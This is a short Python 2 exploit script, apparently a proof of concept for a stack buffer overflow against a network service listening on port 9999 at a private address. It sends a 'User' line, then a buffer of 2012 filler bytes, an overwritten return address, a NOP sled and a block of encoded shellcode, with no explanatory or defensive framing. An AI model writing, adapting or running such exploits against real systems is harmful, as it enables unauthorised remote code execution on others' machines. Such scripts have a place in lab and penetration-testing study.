#!/usr/bin/python
 
import socket,sys
 
address = "192.168.1.104"
port = 9999
retr = "\xdf\x14\x50\x62"
padding = "\x90" * 20
shellcode = ("\xba\x69\x99\x2e\x95\xda\xcf\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x31\x50\x12\x03\x50\x12\x83\x81\x65\xcc\x60\xad\x7e\x93"
"\x8b\x4d\x7f\xf4\x02\xa8\x4e\x34\x70\xb9\xe1\x84\xf2\xef\x0d"
"\x6e\x56\x1b\x85\x02\x7f\x2c\x2e\xa8\x59\x03\xaf\x81\x9a\x02"
"\x33\xd8\xce\xe4\x0a\x13\x03\xe5\x4b\x4e\xee\xb7\x04\x04\x5d"
"\x27\x20\x50\x5e\xcc\x7a\x74\xe6\x31\xca\x77\xc7\xe4\x40\x2e"
"\xc7\x07\x84\x5a\x4e\x1f\xc9\x67\x18\x94\x39\x13\x9b\x7c\x70"
"\xdc\x30\x41\xbc\x2f\x48\x86\x7b\xd0\x3f\xfe\x7f\x6d\x38\xc5"
"\x02\xa9\xcd\xdd\xa5\x3a\x75\x39\x57\xee\xe0\xca\x5b\x5b\x66"
"\x94\x7f\x5a\xab\xaf\x84\xd7\x4a\x7f\x0d\xa3\x68\x5b\x55\x77"
"\x10\xfa\x33\xd6\x2d\x1c\x9c\x87\x8b\x57\x31\xd3\xa1\x3a\x5e"
"\x10\x88\xc4\x9e\x3e\x9b\xb7\xac\xe1\x37\x5f\x9d\x6a\x9e\x98"
"\xe2\x40\x66\x36\x1d\x6b\x97\x1f\xda\x3f\xc7\x37\xcb\x3f\x8c"
"\xc7\xf4\x95\x03\x97\x5a\x46\xe4\x47\x1b\x36\x8c\x8d\x94\x69"
"\xac\xae\x7e\x02\x47\x55\xe9\xed\x30\x54\x8c\x85\x42\x56\x4a"
"\x84\xca\xb0\x38\x38\x9b\x6b\xd5\xa1\x86\xe7\x44\x2d\x1d\x82"
"\x47\xa5\x92\x73\x09\x4e\xde\x67\xfe\xbe\x95\xd5\xa9\xc1\x03"
"\x71\x35\x53\xc8\x81\x30\x48\x47\xd6\x15\xbe\x9e\xb2\x8b\x99"
"\x08\xa0\x51\x7f\x72\x60\x8e\xbc\x7d\x69\x43\xf8\x59\x79\x9d"
"\x01\xe6\x2d\x71\x54\xb0\x9b\x37\x0e\x72\x75\xee\xfd\xdc\x11"
"\x77\xce\xde\x67\x78\x1b\xa9\x87\xc9\xf2\xec\xb8\xe6\x92\xf8"
"\xc1\x1a\x03\x06\x18\x9f\x23\xe5\x88\xea\xcb\xb0\x59\x57\x96"
"\x42\xb4\x94\xaf\xc0\x3c\x65\x54\xd8\x35\x60\x10\x5e\xa6\x18"
"\x09\x0b\xc8\x8f\x2a\x1e")
buffer = "A"*2012 + retr + padding + shellcode
 
try:
    print "[+] Sending buffer"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address,port))
    s.recv(1024)
    s.send("User" + '\r\n')
    s.recv(1024)
    s.send(buffer + '\r\n')
except:
    print "[!] Unable to connect to the application."
    sys.exit(0)
finally:
    s.close()
